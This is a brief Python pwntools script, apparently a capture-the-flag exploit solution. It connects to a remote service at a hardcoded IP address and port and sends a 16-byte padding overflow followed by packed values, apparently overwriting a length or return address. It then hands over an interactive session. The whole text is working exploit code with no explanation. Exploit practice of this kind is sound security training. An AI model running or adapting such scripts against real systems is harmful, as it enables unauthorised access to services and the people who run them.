from pwn import *
context.log_level = 'debug'
p = remote('211.65.197.117', 10006)
p.recv()
p.send('a'*16+p64(0x38))
p.recv()
p.send(p64(0xe8))
p.interactive()
